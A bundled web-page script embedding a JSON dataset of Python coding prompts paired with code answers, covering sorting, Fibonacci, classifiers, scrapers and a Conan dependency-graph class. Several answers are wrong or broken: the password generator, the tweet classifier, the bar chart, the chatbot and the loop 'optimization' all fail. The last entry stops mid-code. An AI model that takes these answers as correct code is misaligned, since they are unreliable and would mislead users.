import{_ as c,o as r,c as n,a as t,m as d,t as m,C as _,M as g,U as y,f as p,F as b,p as w,e as v,q as x}from"./chunks/framework.B1z0IdBH.js";const k={name:"PoemCard",props:{poem:{type:Object,required:!0}}},P={class:"poem-container"},T={class:"review"},C={class:"review-title"},S={class:"review-content"};function q(a,e,l,u,i,o){return r(),n("div",P,[t("div",T,[t("div",C,[e[0]||(e[0]=t("span",{class:"icon"},"question:",-1)),d(m(l.poem.prompt),1)]),e[2]||(e[2]=t("div",{class:"divider"},null,-1)),t("p",S,[e[1]||(e[1]=t("span",{class:"icon"},"answer:",-1)),d(m(l.poem.completion),1)])])])}const I=c(k,[["render",q],["__scopeId","data-v-09452544"]]),j=JSON.parse(`[{"prompt":"The given code is a Python class named DepsGraphBuilder that is responsible for computing the dependencies graph DepsGraph. To use it, create an instance of the class and call the load_graph method with a root node, check_updates, update, remotes, and processed_profile as parameters to load the dependencies graph. To extend build requires, call the extend_build_requires method with a graph, node, build_requires_refs, check_updates, update, remotes, and processed_profile as parameters. The class also has other methods for resolving ranges, handling requirements, configuring nodes, and creating new nodes.","completion":"import time from collections import OrderedDict from conans.client.graph.graph import DepsGraph, Node, RECIPE_EDITABLE from conans.errors import (ConanException, ConanExceptionInUserConanfileMethod, conanfile_exception_formatter) from conans.model.conan_file import get_env_context_manager from conans.model.ref import ConanFileReference from conans.model.requires import Requirements, Requirement from conans.util.log import logger class DepsGraphBuilder(object): \\"\\"\\" Responsible for computing the dependencies graph DepsGraph \\"\\"\\" def __init__(self, proxy, output, loader, resolver, recorder): self._proxy = proxy self._output = output self._loader = loader self._resolver = resolver self._recorder = recorder def load_graph(self, root_node, check_updates, update, remotes, processed_profile): check_updates = check_updates or update dep_graph = DepsGraph() # compute the conanfile entry point for this dependency graph name = root_node.name root_node.public_closure = OrderedDict([(name, root_node)]) root_node.public_deps = {name: root_node} root_node.ancestors = set() dep_graph.add_node(root_node) # enter recursive computation t1 = time.time() self._load_deps(dep_graph, root_node, Requirements(), None, None, check_updates, update, remotes, processed_profile) logger.debug(\\"GRAPH: Time to load deps %s\\" % (time.time() - t1)) return dep_graph def extend_build_requires(self, graph, node, build_requires_refs, check_updates, update, remotes, processed_profile): # The options that will be defined in the node will be the real options values that have # been already propagated downstream from the dependency graph. This will override any # other possible option in the build_requires dependency graph. This means that in theory # an option conflict while expanding the build_requires is impossible node.conanfile.build_requires_options.clear_unscoped_options() new_options = node.conanfile.build_requires_options._reqs_options new_reqs = Requirements() conanfile = node.conanfile scope = conanfile.display_name requires = [Requirement(ref) for ref in build_requires_refs] self._resolve_ranges(graph, requires, scope, update, remotes) for require in requires: name = require.ref.name require.build_require = True self._handle_require(name, node, require, graph, check_updates, update, remotes, processed_profile, new_reqs, new_options) new_nodes = set(n for n in graph.nodes if n.package_id is None) # This is to make sure that build_requires have precedence over the normal requires ordered_closure = list(node.public_closure.items()) ordered_closure.sort(key=lambda x: x[1] not in new_nodes) node.public_closure = OrderedDict(ordered_closure) subgraph = DepsGraph() subgraph.aliased = graph.aliased subgraph.evaluated = graph.evaluated subgraph.nodes = new_nodes for n in subgraph.nodes: n.build_require = True return subgraph def _resolve_ranges(self, graph, requires, consumer, update, remotes): for require in requires: self._resolver.resolve(require, consumer, update, remotes) # if the range is resolved, check if it is an alias alias = graph.aliased.get(require.ref) if alias: require.ref = alias def _resolve_deps(self, graph, node, update, remote_name): # Resolve possible version ranges of the current node requirements # new_reqs is a shallow copy of what is propagated upstream, so changes done by the # RangeResolver are also done in new_reqs, and then propagated! conanfile = node.conanfile scope = conanfile.display_name self._resolve_ranges(graph, conanfile.requires.values(), scope, update, remote_name) if not hasattr(conanfile, \\"_conan_evaluated_requires\\"): conanfile._conan_evaluated_requires = conanfile.requires.copy() elif conanfile.requires != conanfile._conan_evaluated_requires: raise ConanException(\\"%s: Incompatible requirements obtained in different \\" \\"evaluations of 'requirements'n\\" \\" Previous requirements: %sn\\" \\" New requirements: %s\\" % (scope, list(conanfile._conan_evaluated_requires.values()), list(conanfile.requires.values()))) def _load_deps(self, dep_graph, node, down_reqs, down_ref, down_options, check_updates, update, remotes, processed_profile): \\"\\"\\" expands the dependencies of the node, recursively param node: Node object to be expanded in this step down_reqs: the Requirements as coming from downstream, which can overwrite current values param down_ref: ConanFileReference of who is depending on current node for this expansion \\"\\"\\" # basic node configuration: calling configure() and requirements() new_reqs, new_options = self._config_node(dep_graph, node, down_reqs, down_ref, down_options) # if there are version-ranges, resolve them before expanding each of the requirements self._resolve_deps(dep_graph, node, update, remotes) # Expand each one of the current requirements for name, require in node.conanfile.requires.items(): if require.override: continue self._handle_require(name, node, require, dep_graph, check_updates, update, remotes, processed_profile, new_reqs, new_options) def _handle_require(self, name, node, require, dep_graph, check_updates, update, remotes, processed_profile, new_reqs, new_options): # Handle a requirement of a node. There are 2 possibilities # node -(require)-> new_node (creates a new node in the graph) # node -(require)-> previous (creates a diamond with a previously existing node) # If the required is found in the node ancestors a loop is being closed # TODO: allow bootstrapping, use references instead of names if name in node.ancestors or name == node.name: raise ConanException(\\"Loop detected: '%s' requires '%s' which is an ancestor too\\" % (node.ref, require.ref)) # If the requirement is found in the node public dependencies, it is a diamond previous = node.public_deps.get(name) previous_closure = node.public_closure.get(name) # build_requires and private will create a new node if it is not in the current closure if not previous or ((require.build_require or require.private) and not previous_closure): # new node, must be added and expanded (node -> new_node) new_node = self._create_new_node(node, dep_graph, require, name, check_updates, update, remotes, processed_profile) # The closure of a new node starts with just itself new_node.public_closure = OrderedDict([(new_node.ref.name, new_node)]) # The new created node is connected to the parent one node.connect_closure(new_node) if require.private or require.build_require: # If the requirement is private (or build_require), a new public_deps is defined # the new_node doesn't propagate downstream the \\"node\\" consumer, so its public_deps # will be a copy of the node.public_closure, i.e. it can only cause conflicts in the # new_node.public_closure. new_node.public_deps = node.public_closure.copy() new_node.public_deps[name] = new_node else: # Normal requires propagate and can conflict with the parent \\"node.public_deps\\" too new_node.public_deps = node.public_deps.copy() new_node.public_deps[name] = new_node # All the dependents of \\"node\\" are also connected now to \\"new_node\\" for dep_node in node.inverse_closure: dep_node.connect_closure(new_node) # RECURSION, keep expanding (depth-first) the new node self._load_deps(dep_graph, new_node, new_reqs, node.ref, new_options, check_updates, update, remotes, processed_profile) else: # a public node already exist with this name # This is closing a diamond, the node already exists and is reachable alias_ref = dep_graph.aliased.get(require.ref) # Necessary to make sure that it is pointing to the correct aliased if alias_ref: require.ref = alias_ref # As we are closing a diamond, there can be conflicts. This will raise if conflicts self._conflicting_references(previous.ref, require.ref, node.ref) # Add current ancestors to the previous node and upstream deps union = node.ancestors.union([node.name]) for n in previous.public_closure.values(): n.ancestors.update(union) # Even if it was in private scope, if it is reached via a public require # the previous node and its upstream becomes public if previous.private and not require.private: previous.make_public() node.connect_closure(previous) dep_graph.add_edge(node, previous, require.private, require.build_require) # All the upstream dependencies (public_closure) of the previously existing node # now will be also connected to the node and to all its dependants for name, n in previous.public_closure.items(): if n.build_require or n.private: continue node.connect_closure(n) for dep_node in node.inverse_closure: dep_node.connect_closure(n) # Recursion is only necessary if the inputs conflict with the current \\"previous\\" # configuration of upstream versions and options if self._recurse(previous.public_closure, new_reqs, new_options): self._load_deps(dep_graph, previous, new_reqs, node.ref, new_options, check_updates, update, remotes, processed_profile) @staticmethod def _conflicting_references(previous_ref, new_ref, consumer_ref=None): if previous_ref.copy_clear_rev() != new_ref.copy_clear_rev(): if consumer_ref: raise ConanException(\\"Conflict in %sn\\" \\" Requirement %s conflicts with already defined %sn\\" \\" To change it, override it in your base requirements\\" % (consumer_ref, new_ref, previous_ref)) return True # Computed node, if is Editable, has revision=None # If new_ref.revision is None we cannot assume any conflict, the user hasn't specified # a revision, so it's ok any previous_ref if previous_ref.revision and new_ref.revision and previous_ref.revision != new_ref.revision: if consumer_ref: raise ConanException(\\"Conflict in %sn\\" \\" Different revisions of %s has been requested\\" % (consumer_ref, new_ref)) return True return False def _recurse(self, closure, new_reqs, new_options): \\"\\"\\" For a given closure, if some requirements or options coming from downstream is incompatible with the current closure, then it is necessary to recurse then, incompatibilities will be raised as usually\\"\\"\\" for req in new_reqs.values(): n = closure.get(req.ref.name) if n and self._conflicting_references(n.ref, req.ref): return True for pkg_name, options_values in new_options.items(): n = closure.get(pkg_name) if n: options = n.conanfile.options for option, value in options_values.items(): if getattr(options, option) != value: return True return False def _config_node(self, graph, node, down_reqs, down_ref, down_options): \\"\\"\\" update settings and option in the current ConanFile, computing actual requirement values, cause they can be overridden by downstream requires param settings: dict of settings values => {\\"os\\": \\"windows\\"} \\"\\"\\" try: conanfile, ref = node.conanfile, node.ref # Avoid extra time manipulating the sys.path for python with get_env_context_manager(conanfile, without_python=True): if hasattr(conanfile, \\"config\\"): if not ref: conanfile.output.warn(\\"config() has been deprecated.\\" \\" Use config_options and configure\\") with conanfile_exception_formatter(str(conanfile), \\"config\\"): conanfile.config() with conanfile_exception_formatter(str(conanfile), \\"config_options\\"): conanfile.config_options() conanfile.options.propagate_upstream(down_options, down_ref, ref) if hasattr(conanfile, \\"config\\"): with conanfile_exception_formatter(str(conanfile), \\"config\\"): conanfile.config() with conanfile_exception_formatter(str(conanfile), \\"configure\\"): conanfile.configure() conanfile.settings.validate() # All has to be ok! conanfile.options.validate() # Update requirements (overwrites), computing new upstream if hasattr(conanfile, \\"requirements\\"): # If re-evaluating the recipe, in a diamond graph, with different options, # it could happen that one execution path of requirements() defines a package # and another one a different package raising Duplicate dependency error # Or the two consecutive calls, adding 2 different dependencies for the two paths # So it is necessary to save the \\"requires\\" state and restore it before a second # execution of requirements(). It is a shallow copy, if first iteration is # RequireResolve'd or overridden, the inner requirements are modified if not hasattr(conanfile, \\"_conan_original_requires\\"): conanfile._conan_original_requires = conanfile.requires.copy() else: conanfile.requires = conanfile._conan_original_requires.copy() with conanfile_exception_formatter(str(conanfile), \\"requirements\\"): conanfile.requirements() new_options = conanfile.options.deps_package_values if graph.aliased: for req in conanfile.requires.values(): req.ref = graph.aliased.get(req.ref, req.ref) new_down_reqs = conanfile.requires.update(down_reqs, self._output, ref, down_ref) except ConanExceptionInUserConanfileMethod: raise except ConanException as e: raise ConanException(\\"%s: %s\\" % (ref or \\"Conanfile\\", str(e))) except Exception as e: raise ConanException(e) return new_down_reqs, new_options def _create_new_node(self, current_node, dep_graph, requirement, name_req, check_updates, update, remotes, processed_profile, alias_ref=None): \\"\\"\\" creates and adds a new node to the dependency graph \\"\\"\\" try: result = self._proxy.get_recipe(requirement.ref, check_updates, update, remotes, self._recorder) except ConanException as e: if current_node.ref: self._output.error(\\"Failed requirement '%s' from '%s'\\" % (requirement.ref, current_node.conanfile.display_name)) raise e conanfile_path, recipe_status, remote, new_ref = result dep_conanfile = self._loader.load_conanfile(conanfile_path, processed_profile, ref=requirement.ref) if recipe_status == RECIPE_EDITABLE: dep_conanfile.in_local_cache = False dep_conanfile.develop = True if getattr(dep_conanfile, \\"alias\\", None): alias_ref = alias_ref or new_ref.copy_clear_rev() requirement.ref = ConanFileReference.loads(dep_conanfile.alias) dep_graph.aliased[alias_ref] = requirement.ref return self._create_new_node(current_node, dep_graph, requirement, name_req, check_updates, update, remotes, processed_profile, alias_ref=alias_ref) logger.debug(\\"GRAPH: new_node: %s\\" % str(new_ref)) new_node = Node(new_ref, dep_conanfile) new_node.revision_pinned = requirement.ref.revision is not None new_node.recipe = recipe_status new_node.remote = remote # Ancestors are a copy of the parent, plus the parent itself new_node.ancestors = current_node.ancestors.copy() new_node.ancestors.add(current_node.name) # build-requires and private affect transitively. If \\"node\\" is already # a build_require or a private one, its requirements will inherit that property # Or if the require specify that property, then it will get it too new_node.build_require = current_node.build_require or requirement.build_require new_node.private = current_node.private or requirement.private dep_graph.add_node(new_node) dep_graph.add_edge(current_node, new_node, requirement.private, requirement.build_require) return new_node"},{"prompt":"Generate a Python program to edit a given string such that it reverses the words in the string. string = 'This is a string'","completion":"def reverse_words(string): words = string.split(' ') reversed_words = words[::-1] reversed_string = ' '.join(reversed_words) return reversed_string"},{"prompt":"Produce a Python code to sort a two dimensional array in rowwise manner. arr = [[12, 17, 11], [17, 11, 13], [14, 18 22]]","completion":"def row_wise_sorting(arr): for row in arr: row.sort() arr = [[12, 17, 11], [17, 11, 13], [14, 18, 22]] row_wise_sorting(arr) print(arr)"},{"prompt":"Write a Python function that selects which kind of data type (float, integer, string) each element of a list is.","completion":"def infer_data_type(my_list): output_list = [] for item in my_list: if type(item) == int: output_list.append('integer') elif type(item) == float: output_list.append('float') else: output_list.append('string') return output_list"},{"prompt":"Generate a Python script for sorting a list of items alphabetically. items = [Apple, Banana, Cherry, Avocado]","completion":"def sort_items(items): items.sort() return items print(sort_items(items)) # Output ['Apple', 'Avocado', 'Banana', 'Cherry']"},{"prompt":"Design a recursive algorithm in Python to print the first n numbers of the Fibonacci sequence.","completion":"def fibonacci(n): if n <= 1: return n else: return(fibonacci(n-1) + fibonacci(n-2))"},{"prompt":"Write a Python script to compute the mean of a given set of numbers. [78.3, 75.1, 76.7, 78.2]","completion":"def mean(list_of_numbers): total = 0 for num in list_of_numbers: total += num return total / len(list_of_numbers) list_of_numbers = [78.3, 75.1, 76.7, 78.2] mean_of_list = mean(list_of_numbers) print(mean_of_list)"},{"prompt":"Generate a Python program to print out all the permutations of a given string.","completion":"def permutate(string): if len(string) == 0: return [''] prevList = permutate(string[1: len(string)]) nextList = [] for i in range(0,len(prevList)): for j in range(0,len(string)): newString = prevList[i][0: j]+string[0]+prevList[i][j: len(string)-1] if newString not in nextList: nextList.append(newString) return nextList string = input() print(permutate(string))"},{"prompt":"Generate a random 3 x 3 matrix with integer values in Python.","completion":"import random def random_matrix(rows, cols): # creating a 2d array/list matrix = [[random.randint(0, 9) for i in range(cols)] for j in range(rows)] return(matrix) # taking inputs for number of rows and cols rows = 3 cols = 3 print(random_matrix(rows, cols))"},{"prompt":"Construct a Python algorithm to classify a set of tweets as positive or negative.","completion":"# import necessary libraries from sklearn.model_selection import train_test_split from sklearn.feature_extraction.text import CountVectorizer from sklearn.naive_bayes import MultinomialNB # define a function for preprocessing the tweets def preprocess_tweets(tweets): # lowercase the text tweets = tweets.lower() # remove punctuation tweets = tweets.replace('[^ws]',' ') return tweets # define a function for training the model def train_model(X_train, y_train): # initialize count vectorizer vectorizer = CountVectorizer() # fit and transform the data X_train_counts = vectorizer.fit_transform(X_train) # initilaize multinomial classifier clf = MultinomialNB() # fit the classifier clf.fit(X_train_counts, y_train) # return trained model return clf # define a function for testing the model def test_model(model, X_test, y_test): # initialize count vectorizer for test set vectorizer = CountVectorizer() # transform the data X_test_counts = vectorizer.fit_transform(X_test) # predict labels y_pred = model.predict(X_test_counts) # calculate and return accuracy accuracy = accuracy_score(y_pred, y_test) return accuracy # define a main function def main(): # preprocess the data tweets = preprocess_tweets(tweets) # split the data into training and test sets X_train, X_test, y_train, y_test = train_test_split(data, labels, test_size=0.20, random_state=1) # train the model model = train_model(X_train, y_train) # print the test accuracy accuracy = test_model(model, X_test, y_test) print('Test accuracy is {}'.format(accuracy)) # call the main function if __name__ == \\"__main__\\": main()"},{"prompt":"Analyze an unknown dataset using Python, Pandas, and Scikitlearn to identify patterns and correlations. Not applicable","completion":"import pandas as pd from sklearn import preprocessing from sklearn.cluster import KMeans # Read and explore the data — the ‘unknown dataset’ data = pd.read_csv('unknown-dataset.csv') data.head() # Preprocess the data df_scaled = preprocessing.scale(data) # Cluster the data kmeans = KMeans(n_clusters=3, random_state=0).fit(df_scaled) cluster_labels = kmeans.labels_ # Analyze and print the patterns and correlations for i in range(len(cluster_labels)): print(\\"Cluster {}, data {}\\".format(cluster_labels[i], df_scaled[i]))"},{"prompt":"Can you develop a program in Python that generates a random password of length 8 characters, which includes 1 uppercase letter, 1 lowercase letter, 1 number and 1 special character?","completion":"import string import random pwd_length = 8 alphabet = string.ascii_letters + string.digits + string.punctuation pwd = \\"\\" for i in range(pwd_length): char = random.choice(alphabet) if i % 4 == 0 and char in string.ascii_uppercase: pwd += char elif i % 4 == 1 and char in string.ascii_lowercase: pwd += char elif i % 4 == 2 and char in string.digits: pwd += char elif i % 4 == 3 and char in string.punctuation: pwd += char else: pwd += \\"\\" print(\\"Random generated password: \\", pwd)"},{"prompt":"Write a Python program to create a set with the intersection of two given sets.","completion":"def intersection(set_1, set_2): return set_1.intersection(set_2)"},{"prompt":"Can you make a Python program to sort an array of integers from highest to lowest? [6, 2, 8, 3, 9]","completion":"def sort_highest_to_lowest(arr): sorted_arr = sorted(arr, reverse = True) return sorted_arr arr = [6, 2, 8, 3, 9] sorted_arr = sort_highest_to_lowest(arr) print(sorted_arr)"},{"prompt":"Using Python, create a web scraper to extract data from a specified page and save it into a structured format (CSV format preferred). https://example.com","completion":"import requests import csv from bs4 import BeautifulSoup page_url = 'https://example.com' response = requests.get(page_url) soup = BeautifulSoup(response.text, 'html.parser') # Retrieve all of the page's elements elements = soup.find_all('li') # Save elements to a CSV file csv_file = open('scraped.csv','w',encoding='utf-8') csv_writer = csv.writer(csv_file) csv_writer.writerow(['Element']) for element in elements: csv_writer.writerow([element.text]) csv_file.close()"},{"prompt":"Create a simple Python game. The game should contain a main loop that runs infinitely. The user should be able to type commands to play the game and the game should be able to process and respond to these commands. Not applicable","completion":"while True: # prompt the user for input command = input(\\"Enter command: \\") # process the input and respond if command == \\"help\\": print(\\"Available commands are: 'help', 'start', 'stop') elif command == \\"start\\": # start the game here elif command == \\"stop\\": # stop the game here else: print(\\"Invalid command.\\")"},{"prompt":"Construct a stack class in Python to perform push, pop, isEmpty, and peek operations.","completion":"class Stack: def __init__(self): self.items = [] def isEmpty(self): return self.items == [] def push(self, item): self.items.append(item) def pop(self): return self.items.pop() def peek(self): return self.items[len(self.items)-1]"},{"prompt":"Create a python program that outputs the value of two different randomly generated numbers that added up to 25.","completion":"from random import randint num_1 = randint(1, 24) num_2 = 25 - num_1 print(num_1) print(num_2)"},{"prompt":"Generate a script in python to split a given string into words and store them in a list. str = This is a great day","completion":"def split_str(str): words = str.split(\\" \\") return words"},{"prompt":"Generate code to create and populate a database table using Python and SQLite. The table should have following columns: Name (text), Age (integer), Gender (text)","completion":"import sqlite3 conn = sqlite3.connect(':memory:') # Create Table cursor = conn.cursor() cursor.execute(\\"CREATE TABLE people (name text, age integer, gender text)\\") # Insert records cursor.execute(\\"INSERT INTO people VALUES ('John', 25, 'Male')\\") cursor.execute(\\"INSERT INTO people VALUES ('Mary', 30, 'Female')\\") cursor.execute(\\"INSERT INTO people VALUES ('Jane', 18, 'Female')\\") # Commit the changes conn.commit()"},{"prompt":"Create a predictive algorithm in Python to predict the price of a given stock.","completion":"import pandas as pd import numpy as np import matplotlib.pyplot as plt import seaborn as sns from sklearn.model_selection import train_test_split from sklearn.linear_model import LinearRegression def predict_stock_price(data): # clean and prepare the data data = data.dropna() # split the data into features and target values X = data.drop(columns=['price']) y = data['price'] X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42) # create and fit the model lr = LinearRegression().fit(X_train, y_train) # predict on the test data y_pred = lr.predict(X_test) return y_pred"},{"prompt":"Write a script in Python to input a list of strings and convert it into a single string. [‘hello’, ‘world’]","completion":"# Convert list of strings into a single string def list_to_string(lst): return ' '.join(lst)"},{"prompt":"Design a Python function to print a given string in reverse order. Hello world","completion":"def reverse_string(text): # Convert string to list characters = list(text) # Create new empty list to reverse the string rev_characters = [] for char in characters: rev_characters.insert(0, char) # Convert the list back to # the reversed string rev_text = ''.join(rev_characters) return rev_text # Driver code text = \\"Hello world\\" # Print the reversed string print(reverse_string(text))"},{"prompt":"mplement a Principal Component Analysis algorithm in Python.","completion":"from sklearn.decomposition import PCA pca = PCA() pca.fit(X) X_pca = pca.transform(X)"},{"prompt":"Generate code to check for an anagram in Python. Two strings: 'banana' and 'abanan'","completion":"def isAnagram(str1, str2): if len(str1) != len(str2): return False # Sort the strings str1_sorted = ''.join(sorted(str1)) str2_sorted = ''.join(sorted(str2)) # Check if both strings are equal return str1_sorted == str2_sorted # Driver code str1 = 'banana' str2 = 'abanan' if isAnagram(str1, str2): print(\\"The strings are anagrams of each other\\") else: print(\\"The strings are not anagrams\\")"},{"prompt":"Create a neural network classifier for a small handwritten digit dataset using Python.","completion":"import numpy as np import matplotlib.pyplot as plt import pandas as pd # Importing the dataset dataset = pd.read_csv('data.csv') X = dataset.iloc[:, :-1].values y = dataset.iloc[:, 784].values # Encoding categorical data from sklearn.preprocessing import LabelEncoder labelencoder_y = LabelEncoder() y = labelencoder_y.fit_transform(y) # Feature Scaling from sklearn.preprocessing import StandardScaler sc = StandardScaler() X = sc.fit_transform(X) # Splitting the dataset from sklearn.model_selection import train_test_split X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.2, random_state = 0) # Importing the Keras libraries and packages import keras from keras.models import Sequential from keras.layers import Dense # Initialising the ANN classifier = Sequential() # Adding the input layer and the first hidden layer classifier.add(Dense(output_dim = 400, init = 'uniform', activation = 'relu', input_dim = 784)) # Adding the second hidden layer classifier.add(Dense(output_dim = 400, init = 'uniform', activation = 'relu')) # Adding the output layer classifier.add(Dense(output_dim = 10, init = 'uniform', activation = 'softmax')) # Compiling the ANN classifier.compile(optimizer = 'adam', loss = 'categorical_crossentropy', metrics = ['accuracy']) # Fitting the ANN to the Training set classifier.fit(X_train, y_train, batch_size = 128, nb_epoch = 10) # Predicting the Test set results y_pred = classifier.predict(X_test) # Making the Confusion Matrix from sklearn.metrics import confusion_matrix cm = confusion_matrix(y_test, y_pred) # Calculating the accuracy from sklearn.metrics import accuracy_score accuracy = accuracy_score(y_test, y_pred)"},{"prompt":"Compute the sum of list integers using Python. Target list: [3, 5, 7, 9]","completion":"mylist = [3, 5, 7, 9] total = 0 for item in mylist: total = total + item print(\\"The sum of list items is:\\", total)"},{"prompt":"Write a Python program to implement Quick Sort algorithm","completion":"def quick_sort(arr): if len(arr) <= 1: return arr pivot = arr[len(arr) // 2] lesser_arr, equal_arr, greater_arr = [], [], [] for num in arr: if num < pivot: lesser_arr.append(num) elif num == pivot: equal_arr.append(num) else: greater_arr.append(num) return quick_sort(lesser_arr) + equal_arr + quick_sort(greater_arr)"},{"prompt":"Write a Python program to construct an array by repeating \`add\`, \`subtract\`, \`multiply\` and \`divide\` operations. [1, 4, 6]","completion":"results = [-1, 4, -6] # loop through the list for i in range(len(results)): # if the element is positive add one if results[i] > 0: results[i] = results[i] + 1 # if the element is negative subtract one elif results[i] < 0: results[i] = results[i] - 1 # multiply by 2 results[i] = results[i] * 2 # divide by 4 results[i] = results[i] / 4 print(results)"},{"prompt":"Generate a script to send an email using Python. email: test@example.com subject: test content: Hello World","completion":"import smtplib sender = 'test@example.com' receiver = 'test@example.com' subject = 'test' message = 'Hello World' try: smtpObj = smtplib.SMTP('localhost') smtpObj.sendmail(sender, receiver, \\"Subject: \\" + subject + \\"n\\" + message) print(\\"Successfully sent email\\") except Exception as e: print(\\"Error: unable to send email\\")"},{"prompt":"Create a program to execute a linear search in Python.","completion":"def linear_search(numbers, key): for index, element in enumerate(numbers): if element == key: return index return -1"},{"prompt":"Create a program in Python that takes a string as an input and prints out all unique substrings in the input string. abcabc","completion":"string = \\"abcabc\\" # To store unique substring list_unique_substrings = [] # Iterating through the length of string for index_i in range(len(string)): # Iterating through the range of index_i and string length for index_j in range(index_i, len(string)): # Slice the substring from index_i to index_j substr = string[index_i: index_j + 1] # check if substring is already in list if substr not in list_unique_substrings: list_unique_substrings.append(substr) # Print the list of unique substrings print(list_unique_substrings)"},{"prompt":"Write a Python program to print Fibonacci series up to a given number.","completion":"def Fibonacci(n): if n==0: return 0 elif n==1: return 1 else: return Fibonacci(n-1)+Fibonacci(n-2) # Driver Code print(\\"Fibonacci series:\\") for i in range(10): print(Fibonacci(i), end=\\" \\")"},{"prompt":"Create a Python program to filter out all negative numbers from a list.","completion":"def filter_negative(data): \\"\\"\\"Filters out all negative numbers from a list\\"\\"\\" return [x for x in data if x >= 0]"},{"prompt":"Create a Python program to detect if the given number is a prime number or not.","completion":"def is_prime(num): # 1 is not a prime number if num == 1: return False for i in range(2, num): if num % i == 0: return False return True"},{"prompt":"Create a Python class that implements a max heap data structure.","completion":"class MaxHeap: def __init__(self, array): self.heap = self.build_heap(array) def build_heap(self, array): n = len(array) for i in reversed(range(n // 2)): self.heapify(i, array, n) return array def heapsort(self, array): n = len(array) for i in reversed(range(n)): array[i], array[0] = array[0], array[i] self.heapify(0, array, i) return array def heapify(self, current_index, array, heap_size): largest = current_index left_child = 2 * current_index + 1 right_child = 2 * current_index + 2 if (left_child < heap_size and array[left_child] > array[largest]): largest = left_child if (right_child < heap_size and array[right_child] > array[largest]): largest = right_child if largest != current_index: array[largest], array[current_index] = ( array[current_index], array[largest] ) self.heapify(largest, array, heap_size)"},{"prompt":"Suggest a way to generate summaries from long articles using Python.","completion":"The most common way of generating summaries from long articles using Python is to use Natural Language Processing (NLP) to identify the most important sentences in the text. We can use existing libraries such as summa and NLTK to identify the most important sentences in the text. The main steps involved in generating summaries are: 1. Preprocessing the raw text by removing punctuation marks, HTML tags, special characters and stop words and tokenizing the text into sentences. 2. Using TextRank Algorithm to determine the most important sentences in the text. 3. Generating the summary by selecting the most important sentences and combining them into a cohesive statement or narrative."},{"prompt":"Write a Python program that takes a list of words and returns a dictionary where the keys are the words and the values are the lengths of the words. words = ['cat', 'dog', 'kangaroo', 'tiger']","completion":"def word_lengths(words): lengths = {} for word in words: lengths[word] = len(word) return lengths result = word_lengths(['cat', 'dog', 'kangaroo', 'tiger']) print(result)"},{"prompt":"Generate Python code to visualize this data using a bar chart. Data: { 'Boys': [50, 80, 100, 90], 'Girls': [60, 70, 90, 95] }","completion":"import matplotlib.pyplot as plt # Create data labels = ['Boys', 'Girls'] values =[50, 80, 100, 90, 60, 70, 90, 95] # naming the x-axis plt.xlabel('Category') # naming the y-axis plt.ylabel('Score') # plot title plt.title('Bar Plot') # plot the generated values plt.bar(labels, values) # function to show the plot plt.show()"},{"prompt":"Suggest improvements to the following Python code. def get_fibonacci_series(n): series = [] for i in range(n): if i == 0 or i == 1: series.append(i) else: series.append(series[i1] + series[i2]) return serie","completion":"def get_fibonacci_series(n): # Initialize empty list for Fibonacci series series = [] a = 0 b = 1 # Iterate till number of terms required for i in range(n): series.append(a) c = a + b a = b b = c return series"},{"prompt":"Design a Python script to nested loop iterate the following list of lists. arr = [['a', 'b', 'c'], ['d', 'e', 'f'], ['g', 'h', 'i']]","completion":"for outer in arr: for inner in outer: print(inner)"},{"prompt":"Develop a Python program that will build a random forest classifier for an input dataset. The path to the dataset in CSV form","completion":"import pandas as pd from sklearn.ensemble import RandomForestClassifier # Load the dataset dataframe = pd.read_csv(<path_to_csv>) X = dataframe.iloc[:, 0:4].values y = dataframe.iloc[:, 4].values # Train the classifier classifier = RandomForestClassifier(n_estimators=100, random_state=0) classifier.fit(X, y) # Make predictions y_pred = classifier.predict(X)"},{"prompt":"Write a python program to execute the following statement with a given input n = 5","completion":"def factorial(n): if n == 0: return 1 else: return n*factorial(n-1) result = factorial(5) print(result)"},{"prompt":"Write a Python program that prints out the numbers from 1 to 100, with the exception of numbers divisible by 3, which should be printed as Fizz and numbers divisible by 5, which should be printed as Buzz. Numbers divisible by both 3 and 5 should be printed out as FizzBuzz. Not applicable","completion":"for i in range(1, 101): if i % 3 == 0 and i % 5 == 0: print(\\"FizzBuzz\\") elif i % 3 == 0: print(\\"Fizz\\") elif i % 5 == 0: print(\\"Buzz\\") else: print(i)"},{"prompt":"Optimize the following Python code to remove any redundant operations. x = 0 for i in range(100): for j in range(100): x += i x += j","completion":"x = 0 for i in range(100): x += i * 100 for j in range(100): x += j"},{"prompt":"Design a Python class called 'Student' with the following properties – name, age, gender.","completion":"class Student: def __init__(self, name, age, gender): self.name = name self.age = age self.gender = gender def get_name(self): return self.name def get_age(self): return self.age def get_gender(self): return self.gender"},{"prompt":"Design a chatbot application in Python which can answer simple questions. Not applicable","completion":"import nltk nltk.download('punkt') from nltk.stem.lancaster import LancasterStemmer stemmer = LancasterStemmer() import numpy import tflearn import tensorflow import random import json with open(\\"intents.json\\") as file: data = json.load(file) words = [] labels = [] docs_x = [] docs_y = [] for intent in data[\\"intents\\"]: for pattern in intent[\\"patterns\\"]: wrds = nltk.word_tokenize(pattern) words.extend(wrds) docs_x.append(wrds) docs_y.append(intent[\\"tag\\"]) # Stem and lowercase the words words = [stemmer.stem(w.lower()) for w in words if w != \\"?\\"] words = sorted(list(set(words))) labels = sorted(labels) training = [] output = [] # Create training data out_empty = [0 for _ in range(len(labels))] for x, doc in enumerate(docs_x): bag = [] w = [stemmer.stem(w.lower()) for w in doc] for w in words: if w in w: bag.append(1) else: bag.append(0) output_row = out_empty[:] output_row[labels.index(docs_y[x])] = 1 training.append(bag) output.append(output_row) training = numpy.array(training) output = numpy.array(output) # Build the model tensorflow.reset_default_graph() net = tflearn.input_data(shape=[None, len(training[0])]) net = tflearn.fully_connected(net, 8) net = tflearn.fully_connected(net, 8) net = tflearn.fully_connected(net, len(output[0]), activation=\\"softmax\\") net = tflearn.regression(net) model = tflearn.DNN(net) # Train the model model.fit(training, output, n_epoch=1000, batch_size=8, show_metric=True) model.save(\\"model.tflearn\\") # Chatbot function def chatbot_response(sentence): sentence = sentence.lower() results = model.predict([bag_of_words(sentence, words)]) results_index = numpy.argmax(results) tag = labels[results_index] for tg in data[\\"intents\\"]: if tg['tag'] == tag: responses = tg['responses'] return random.choice(responses)"},{"prompt":"Create an API in Python with Flask for an online store. The API should include endpoints to list items, get items by id, add items, update items, and delete items. Not Applicable","completion":"from flask import Flask, jsonify, request from flask_sqlalchemy import SQLAlchemy app = Flask(__name__) 